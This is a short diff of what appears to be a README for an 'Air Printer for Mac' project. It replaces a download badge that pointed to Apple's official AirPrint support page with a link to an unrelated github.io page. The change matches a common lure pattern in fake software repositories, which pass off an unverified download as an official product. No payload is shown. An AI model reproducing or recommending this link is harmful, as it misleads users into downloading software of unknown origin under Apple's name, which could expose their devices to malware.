@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Air Printer Mac](https://img.shields.io/badge/Get_Air_Printer_for_Mac-blue?style=for-the-badge&logo=apple)](https://support.apple.com/guide/mac-help/use-airprint-printers-mchlp1110/mac)
+[![Get Air Printer Mac](https://img.shields.io/badge/Get_Air_Printer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/airprinter)
 
 </div>
 
